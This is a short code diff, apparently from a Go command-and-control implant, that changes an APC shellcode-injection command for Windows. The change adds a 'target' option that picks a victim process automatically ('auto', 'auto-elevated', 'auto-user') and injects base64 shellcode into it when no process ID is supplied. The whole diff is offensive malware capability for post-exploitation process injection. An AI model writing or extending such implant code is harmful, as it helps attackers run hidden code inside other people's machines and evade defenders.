@@ -53,9 +53,11 @@ type ApcInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	TID          int    `json:"tid"`
+	Target       string `json:"target"` // "auto", "auto-elevated", "auto-user"
 }
 
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
+	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
 		return errorResult("Error: This command is only supported on Windows")
 	}
@@ -68,6 +70,21 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	if params.ShellcodeB64 == "" {
 		return errorResult("Error: No shellcode data provided")
 	}
+
+	// Auto-select target if target mode is specified
+	if params.Target != "" && params.PID <= 0 {
+		mode := TargetMode(strings.ToLower(params.Target))
+		targets, terr := SelectInjectionTarget(mode)
+		if terr != nil {
+			return errorf("Target selection failed: %v", terr)
+		}
+		bestPID, berr := BestTarget(targets)
+		if berr != nil {
+			return errorf("No suitable target: %v", berr)
+		}
+		params.PID = int(bestPID)
+	}
+
 	if params.PID <= 0 {
 		return errorResult("Error: Invalid PID specified")
 	}
